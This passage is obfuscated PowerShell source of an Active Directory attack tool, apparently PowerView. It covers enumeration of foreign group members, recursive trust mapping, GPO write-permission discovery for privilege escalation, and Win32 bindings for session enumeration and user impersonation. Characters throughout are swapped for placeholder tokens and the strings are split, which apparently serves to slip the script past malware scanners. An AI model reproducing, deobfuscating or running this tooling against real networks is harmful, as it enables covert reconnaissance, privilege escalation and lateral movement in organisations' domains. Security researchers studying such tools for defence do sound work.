.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

'+'.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential gIF1Cred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ForeignGroupMember41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        gIF1SearcherArguments[41aLDAPFilter41a] = 41a(member=*)41a
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBou'+'ndParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        if (gIF1PSBoundParameters[41aRaw41a]) { gIF1SearcherArguments[41aRaw41a] = gIF1Raw }
    }

    PROCESS {
        # standard group names to ignore
        gIF1ExcludeGroups = @(41aUsers41a, 41aDomain Users41a, 41aGuests41a)

        Get-DomainGroup @SearcherArguments U9B Where-Object { gIF1ExcludeGroups -notcontains gIF1_.samaccountname } U9B ForEach-Object {
            gIF1GroupName = gIF1_.samAccountName
            gIF1GroupDistinguishedName = gIF1_.distinguishedname
            gIF1GroupDomain = gIF1GroupDistinguishedName.SubString(gIF1GroupDistinguishedName.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a

            gIF1_.member U9B ForEach-Object {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesn41at end with the proper DN for the queried domain
                gIF1MemberDomain = gIF1_.SubString(gIF1_.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                if ((gIF1_ -match 41aCN=S-1-5-21.*-.*41a) -or (gIF1GroupDomain -ne gIF1MemberDomain)) {
                    gIF1MemberDistinguishedName = gIF1_
                    gIF1MemberName = gIF1_.Split(41a,41a)[0].split(41a=41a)[1]

                    gIF1ForeignGroupMember = New-Object PSObject
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aGroupDomain41a gIF1GroupDomain
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aGroupDistinguishedName41a gIF1GroupDistinguishedName
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aMemberDomain41a gIF1MemberDomain
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aMemberName41a gIF1MemberName
                    gIF1ForeignGroupMember U9B Add-Member Noteproperty 41aMemberDistinguishedName41a gIF1MemberDistinguishedName
                    gIF1ForeignGroupMember.PSObject.TypeNames.Insert(0, 41aPowerView.ForeignGroupMember41a)
                    gIF1ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
<#
.SYNOPSIS

This function enumerates all trusts for the current domain and then enumerates
all trusts for each domain it finds.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  

.DESCRIPTION

This function will enumerate domain trust relationships for the current domain using
a number of methods, and then enumerates all trusts for each found domain, recursively
mapping all reachable trust relationships. By default, and LDAP search using the filter
41a(objectClass=trustedDomain)41a is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead. If any 

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
built-in LDAP method.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that'+' is used to filter Active Directory objects.

'+'
.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should '+'also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

'+'Get-DomainTrustMapping U9B Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -API U9B Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -NET U9B Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainTrustMapping -Server 41aPRIMARY.testlab.local41a U9B Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
using the specified alternate credentials, and output everything to a .csv file.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.DomainTrust.NET41a)]
    [OutputType(41aPowerView.DomainTrust.LDAP41a)]
    [OutputType(41aPowerView.DomainTrust.API41a)]
    [CmdletBinding(DefaultParameterSetName = 41aLDAP41a)]
    Param(
        [Parameter(ParameterSetName = 41aAPI41a)]
        [Switch]
        gIF1API,

        [Parameter(ParameterSetName = 41aNET41a)]
        [Switch]
        gIF1NET,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Parameter(ParameterSetName = 41aAPI41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Parameter(Param'+'eterSetName = 41aLDAP41a)]
        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Switch]
        gIF1Tombstone,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    # keep track of domains seen so we don41at hit infinite recursion
    gIF1SeenDomains = @{}

    # our domain status tracker
    gIF1Domains = New-Object System.Collections.Stack

    gIF1DomainTrustArguments = @{}
    if (gIF1PSBoundParameters[41aAPI41a]) { gIF1DomainTrustArguments[41aAPI41a] = gIF1API }
    if (gIF1PSBoundParameters[41aNET41a]) { gIF1DomainTrustArguments[41aNET41a] = gIF1NET }
    if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1DomainTrustArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
    if (gIF1PSBoundParameters[41aProperties41a]) { gIF1DomainTrustArguments[41aProperties41a] = gIF1Properties }
    if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1DomainTrustArguments[41aSearchBase41a] = gIF1SearchBase }
    if (gIF1PSBoundParameters[41aServer41a]) { gIF1DomainTrustArguments[41aServer41a] = gIF1Server }
    if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1DomainTrustArguments[41aSearchScope41a] = gIF1SearchScope }
    if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1DomainTrustArguments[41aResultPageSize41a] = gIF1ResultPageSize }
    if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1DomainTrustArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
    if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1DomainTrustArguments[41aTombstone41a] = gIF1Tombstone }
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1DomainTrustArguments[41aCredential41a] = gIF1Credential }

    # get the current domain and push it onto the stack
    if (gIF1PSBoundParameters[41aCredential41a]) {
        gIF1CurrentDomain = (Get-Domain -Credential gIF1Credential).Name
    }
    else {
        gIF1CurrentDomain = (Get-Domain).Name
    }
    gIF1Domains.Push(gIF1CurrentDomain)

    while(gIF1Domains.Count -ne 0) {

        gIF1Domain = gIF1Domains.Pop()

        # if we haven41at seen this domain before
        if (gIF1Domain -and (gIF1Domain.Trim() -ne 41a41a) -and (-not gIF1SeenDomains.ContainsKey(gIF1Domain))) {

            Write-Verbose Zfr[Get-DomainTrustMapping] Enumerating trusts for domain: 41agIF1Domain41aZfr

            # mark it as seen in our list
            gIF1Null = gIF1SeenDomains.Add(gIF1Domain, 41a41a)

            try {
                # get all the trusts for this domain
                gIF1DomainTrustArguments[41aDomain41a] = gIF1Domain
                gIF1Trusts = Get-DomainTrust @DomainTrustArguments

                if (gIF1Trusts -isnot [System.Array]) {
                    gIF1Trusts = @(gIF1Trusts)
                }

                # get any forest trusts, if they exist
                if (gIF1PsCmdlet.ParameterSetName -eq 41aNET41a) {
                    gIF1ForestTrustArguments = @{}
                    if (gIF1PSBoundParameters[41aForest41a]) { gIF1ForestTrustArguments[41aForest41a] = gIF1Forest }
                    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ForestTrustArguments[41aCredential41a] = gIF1Credential }
                    gIF1Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if (gIF1Trusts) {
                    if (gIF1Trusts -isnot [System.Array]) {
                        gIF1Trusts = @(gIF1Trusts)
                    }

                    # enumerate each trust found
                    ForEach (gIF1Trust in gIF1Trusts) {
                        if (gIF1Trust.SourceName -and gIF1Trust.TargetName) {
                            # make sure we process the target
                            gIF1Null = gIF1Domains.Push(gIF1Trust.TargetName)
                            gIF1Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose Zfr[Get-DomainTrustMapping] Error: gIF1_Zfr
            }
        }
    }
}


function Get-GPODelegation {
<#
.SYNOPSIS

Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.

Author: Itamar Mizrahi (@MrAnde7son)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER GPOName

The GPO display name to query for, wildcards accepted.

.PARAMETER PageSize

Specifies the PageSize to set for the LDAP searcher object.

.EXAMPLE

Get-GPODelegation

Returns all GPO delegations in current f'+'orest.

.EXAMPLE

Get-GPODelegation -GPOName

Returns all GPO delegations on a given GPO.
#>

    [CmdletBinding()]
    Param (
        [String]
        gIF1GPOName = 41a*41a,

        [ValidateRange(1,10000)] 
        [Int]
        gIF1PageSize = 200
    )

    gIF1Exclusions = @(41aSYSTEM41a,41aDomain Admins41a,41aEnterprise Admins41a)

    gIF1Forest = [System.DirectoryServices.ActiveDire'+'ctory.Forest]::GetCurrentForest()
    gIF1DomainList = @(gIF1Forest.Domains)
    gIF1Domains = gIF1DomainList U9B foreach { gIF1_.GetDirectoryEntry() }
    foreach (gIF1Domain in gIF1Domains) {
        gIF1Filter = Zfr(&(objectCategory=groupPolicyContainer)(displayname=gIF1GPOName))Zfr
        gIF1Searcher = New-Object System.DirectoryServices.DirectorySearcher
        gIF1Searcher.SearchRoot = gIF1Domain
        gIF1Searcher.Filter = gIF1Filter
        gIF1Searcher.PageSize = gIF1PageSize
        gIF1Searcher.SearchScope = ZfrSubtreeZfr
        gIF1listGPO = gIF1Searcher.FindAll()
        foreach (gIF1gpo in gIF1listGPO){
            gIF1ACL = ([ADSI]gIF1gpo.path).ObjectSecurity.Access U9B ? {gIF1_.ActiveDirectoryRights -match ZfrWriteZfr -and gIF1_.AccessControlType -eq ZfrAllowZfr -and  gIF1Exclusions -notcontains gIF1_.IdentityReference.toString().split(ZfrYwWZfr)[1] -and gIF1_.IdentityReference -ne ZfrCREATOR OWNERZfr}
        if (gIF1ACL -ne gIF1null){
            gIF1GpoACL = New-Object psobject
            gIF1GpoACL U9B Add-Member Noteproperty 41aADSPath41a gIF1gpo.Properties.adspath
            gIF1GpoACL U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1gpo.Properties.displayname
            gIF1GpoACL U9B Add-Member Noteproperty 41aIdentityReference41a gIF1ACL.IdentityReference
            gIF1GpoACL U9B Add-Member Noteproperty 41aActiveDirectoryRights41a gIF1ACL.ActiveDirectoryRights
            gIF1GpoACL
        }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are execu'+'ted, they are baked in
# and can41at be changed while the script is running!
#
########################################################

gIF1Mod = New-InMemoryModule -ModuleName Win32

# [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSAvoidUsingPositionalParameters41a, Scope=41aFunction41a, Target=41apsenum41a)]

# used to parse the 41asamAccountType41a property for users/computers/groups
gIF1SamAccountTypeEnum = psenum gIF1Mod PowerView.SamAc'+'countTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   41a0x0000000041a
    GROUP_OBJECT                    =   41a0x1000000041a
    NON_SECURITY_GROUP_OBJECT       =   41a0x1000000141a
    ALIAS_OBJECT                    =   41a0x2000000041a
    NON_SECURITY_ALIAS_OBJECT       =   41a0x2000000141a
    USER_OBJECT                     =   41a0x3000000041a
    MACHINE_ACCOUNT                 =   41a0x3000000141a
    TRUST_ACCOUNT                   =   41a0x3000000241a
    APP_BASIC_GROUP                 =   41a0x4000000041a
    APP_QUERY_GROUP                 =   41a0x4000000141a
    ACCOUNT_TYPE_MAX                =   41a0x7fffffff41a
}

# used to parse the 41agrouptype41a property for groups
gIF1GroupTypeEnum = psenum gIF1Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   41a0x0000000141a
    GLOBAL_SCOPE                    =   41a0x0000000241a
    DOMAIN_LOCAL_SCOPE              =   41a0x0000000441a
    UNIVERSAL_SCOPE                 = '+'  41a0x0000000841a
    APP_BASIC                       =   41a0x0000001041a
    APP_QUERY                       =   41a0x0000002041a
    SECURITY                        =   41a0x8000000041a
} -Bitfield

# used to parse the 41auserAccountControl41a property for users/groups
gIF1UACEnum = psenum gIF1Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH '+'               =   4194304
    PASSWORD_EXPIRE'+'D                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by gIF1WTS_SESSION_INFO_1 below
gIF1WTSConnectState = psenum gIF1Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
gIF1WTS_SESSION_INFO_1 = struct gIF1Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 gIF1WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @(41aLPWStr41a)
    pHostName = field 4 String -MarshalAs @(41aLPWStr41a)
    pUserName = field 5 String -MarshalAs @(41aLPWStr41a)
    pDomainName = field 6 String -MarshalAs @(41aLPWStr41a)
    pFarmName = field 7 String -MarshalAs @(41aLPWStr41a)
}

# the particular WTSQuerySessionInformation result structure
gIF1WTS_CLIENT_ADDRESS = struct gIF1mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @(41aByValArray41a, 20)
}

# the NetShareEnum result structure
gIF1SHARE_INFO_1 = struct gIF1Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @(41aLPWStr41a)
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @(41aLPWStr41a)
}

# the NetWkstaUserEnum result structure
gIF1WKSTA_USER_INFO_1 = struct gIF1Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @(41aLPWStr41a)
    LogonDomain = field 1 String -MarshalAs @(41aLPWStr41a)
    AuthDomains = field 2 String -MarshalAs @(41aLPWStr41a)
    LogonServer = field 3 String -MarshalAs @(41aLPWStr41a)
}

# the NetSessionEnum result structure
gIF1SESSION_INFO_10 = struct gIF1Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @(41aLPWStr41a)
    UserName = field 1 String -MarshalAs @(41aLPWStr41a)
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# enum used by gIF1LOCALGROUP_MEM'+'BERS_INFO_2 below
gIF1SID_NAME_USE = psenum gIF1Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
gIF1LOCALGROUP_INFO_1 = struct gIF1Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @(41aLPWStr41a)
    lgrpi1_comment = field 1 String -MarshalAs @(41aLPWStr41a)
}

# the NetLocalGroupGetMembers result structure
gIF1LOCALGROUP_MEMBERS_INFO_2 = struct gIF1Mod LOCALGROU'+'P_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 gIF1SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @(41aLPWStr41a)
}

# enums used in DS_DOMAIN_TRUSTS
gIF1DsD'+'omainFlag = psenum gIF1Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
gIF1DsDomainTrustType = psenum gIF1Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
gIF1DsDomainTrustAttributes = psenum gIF1Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
gIF1DS_DOMAIN_TRUSTS = struct gIF1Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @(41aLPWStr41a)
    DnsDomainName = field 1 String -MarshalAs @(41aLPWStr41a)
    Flags = field 2 gIF1DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 gIF1DsDomainTrustType
    TrustAttributes = field 5 gIF1DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# used by WNetAddConnection2W
gIF1NETRESOURCEW = struct gIF1Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @(41aLPWStr41a)
    lpRemoteName =    field 5 String -MarshalAs @(41aLPWStr41a)
    lpComment =       field 6 String -MarshalAs @(41aLPWStr41a)
    lpProvider =      field 7 String -MarshalAs @(41aLPWStr41a)
}

# all of the Win32 API functions we need
gIF1FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], ['+'String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (f'+'unc wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @(gIF1NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

gIF1Types = gIF1FunctionDefinitions U9B Add-Win32Type -Module gIF1Mod -Namespace 41aWin3241a
gIF1Netapi32 = gIF1Types[41anetapi3241a]
gIF1Advapi32 = gIF1Types[41aadvapi3241a]
gIF1Wtsapi32 = gIF1Types[41awtsapi3241a]
gIF1Mpr = gIF1Types[41aMpr41a]
gIF1Kernel32 = gIF1Types[41akernel3241a]

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
